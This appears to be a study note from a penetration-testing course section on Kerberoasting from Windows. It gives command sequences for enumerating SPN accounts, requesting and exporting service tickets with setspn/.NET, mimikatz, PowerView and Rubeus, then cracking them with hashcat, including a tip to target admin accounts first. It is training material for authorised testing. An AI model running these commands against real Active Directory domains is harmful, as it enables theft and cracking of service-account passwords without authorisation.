# Section 18: Kerberoasting - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1423
- Code/command blocks: 23

> Terminal output is omitted; only commands & scripts are captured.

Kerberoasting = get a crackable ticket for any account that has an SPN. Every method below follows the same 4 steps:

1. **Find** accounts with an SPN (kerberoastable — usually service accounts).
2. **Request** a TGS ticket for that SPN (any domain user can; no special privs).
3. **Extract** the encrypted ticket (encrypted with the service account's password-derived key).
4. **Crack** it offline → recover the plaintext password. No failed logons, no lockouts.

Pick **one** method. Rubeus (Method 3) is the easy button; from Kali use `impacket-GetUserSPNs` ([17](17-kerberoasting-from-linux.md)).

## Method 1 — Manual / LOLBIN

The "no purpose-built tools" way. Most steps, most fragile — educational more than practical.

| Step | Command | Why here |
|---|---|---|
| 1 | `setspn.exe -Q */*` | **Enumerate SPNs** — find what's roastable. Built-in. |
| 2 | `New-Object ...KerberosRequestorSecurityToken` | **Request the TGS** for one SPN via .NET → ticket lands in your session cache (memory). |
| 3 | `setspn -T … \| … KerberosRequestorSecurityToken …` | Same but **bulk** — request tickets for all SPNs at once. |
| 4 | `mimikatz "base64 /out:true" "kerberos::list /export"` | **Extract** the in-memory tickets as base64 `.kirbi`. |
| 5 | `echo "<blob>" \| tr -d \\n` | Strip newlines from the base64 blob. |
| 6 | `base64 -d > sqldev.kirbi` | Decode back to the binary ticket (on Linux). |
| 7 | `kirbi2john.py sqldev.kirbi` | Convert ticket → crackable hash (JtR format). |
| 8 | `sed '…$krb5tgs$23$…'` | Reformat JtR output → hashcat format. |
| 9 | `hashcat -m 13100 …` | **Crack.** |

```cmd
setspn.exe -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.{{DOMAIN}}:1433"
```

```powershell
setspn.exe -T {{DOMAIN}} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```powershell
# extract the requested tickets from the session cache as base64 .kirbi (kerberos::list needs no admin)
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"
```

```bash
echo "<base64 blob>" |  tr -d \\n 
```

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

```bash
cat sqldev_tgs_hashcat 
```

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

## Method 2 — PowerView

`Get-DomainSPNTicket` does request + format in one shot.

| Step | Command | Why here |
|---|---|---|
| 1 | `Import-Module .\PowerView.ps1` | Load PowerView first (else `CommandNotFoundException`). |
| 2 | `Get-DomainUser * -spn \| select samaccountname` | **Enumerate** SPN accounts. |
| 3 | `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | **Request + format** one account's hash (hashcat-ready). |
| 4 | `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv …` | **Bulk** — all SPN accounts → CSV. |
| 5 | `cat .\ilfreight_tgs.csv` → `hashcat -m 13100` | View, then crack. |

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

```powershell
cat .\ilfreight_tgs.csv
```

## Method 3 — Rubeus (easy button)

Request + extract + format internally → straight to hashcat.

| Step | Command | Why here |
|---|---|---|
| 1 | `.\Rubeus.exe` | Help/usage. |
| 2 | `.\Rubeus.exe kerberoast /stats` | **Recon** — count of roastable accounts + their enc types. |
| 3 | `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | **Target admins first** (best value). `/nowrap` = clean output. |
| 4 | `.\Rubeus.exe kerberoast /user:testspn /nowrap` | Roast one specific account. |

```powershell
.\Rubeus.exe
```

```powershell
.\Rubeus.exe kerberoast /stats
```

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

## RC4 vs AES (which hashcat mode)

Not a new method — an **encryption-type gotcha**. The account's supported enc type decides your hashcat mode.

| Step | Command | Why |
|---|---|---|
| 1 | `Get-DomainUser testspn -Properties …msds-supportedencryptiontypes` | **Check enc types** → picks your mode. |
| 2 | `hashcat -m 13100 rc4_to_crack` | **RC4** (etype 23) → mode **13100**. Fast/weak — ideal. |
| 3 | `.\Rubeus.exe kerberoast /user:testspn /nowrap` | If only **AES** supported, you get an AES ticket. |
| 4 | `hashcat -m 19700 aes_to_crack` | **AES256** (etype 18) → mode **19700**. Much slower. |

> `-m 13100` = RC4, `-m 19700` = AES256. Feeding an AES hash to 13100 just fails — always check `msds-supportedencryptiontypes` (or Rubeus `/stats`) first.

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```powershell
 .\Rubeus.exe kerberoast /user:testspn /nowrap
```

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
